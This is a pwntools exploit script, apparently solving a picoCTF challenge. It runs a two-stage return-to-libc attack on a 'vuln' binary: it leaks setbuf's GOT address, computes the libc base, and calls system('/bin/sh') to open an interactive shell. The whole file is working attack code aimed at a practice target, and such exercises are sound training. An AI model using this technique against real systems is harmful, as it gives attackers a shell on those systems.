import pwn

p = pwn.process('./vuln')
# p = pwn.remote("mercury.picoctf.net", 23584)
offset = 136
junk = b'A'*offset
pop_rdi = 0x400913
setbuf_at_got = 0x601028
puts_in_plt = 0x400540
main = 0x400771
pyload = [
    junk,
    pwn.p64(pop_rdi),
    pwn.p64(setbuf_at_got),
    pwn.p64(puts_in_plt),   
    pwn.p64(main)
]
p.readuntil("WeLcOmE To mY EcHo sErVeR!")

p.sendline(b"".join(pyload))
output = p.readline()
output = p.readline()
setbuf_real_address = p.readline()
setbuf_real_address = pwn.u64(setbuf_real_address.strip().ljust(8,b'\x00'))

setbuf_offset = 0x88540
system_offset = 0x4f4e0
bin_sh_string_offset = 0x1b40fa
base_libc = setbuf_real_address - setbuf_offset
real_system = base_libc + system_offset
real_bin_sh_string = base_libc + bin_sh_string_offset

p.readuntil("WeLcOmE To mY EcHo sErVeR!")

ret_instruction = 0x40052e
pyload2 = [
    junk,
    pwn.p64(pop_rdi),
    pwn.p64(real_bin_sh_string),
    pwn.p64(ret_instruction),
    pwn.p64(real_system),   
]

p.sendline(b"".join(pyload2))
p.interactive()
